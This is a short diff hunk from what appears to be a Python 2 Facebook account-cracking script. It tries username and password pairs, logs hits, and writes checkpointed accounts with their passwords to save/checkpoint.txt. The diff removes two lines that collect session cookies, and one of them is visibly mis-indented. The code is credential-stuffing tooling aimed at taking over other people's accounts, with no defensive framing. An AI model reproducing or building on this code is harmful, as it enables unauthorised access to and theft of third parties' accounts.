@@ -14579,8 +14579,6 @@ def action():
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
 					print '\033[1;97m[ⓇDX-CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
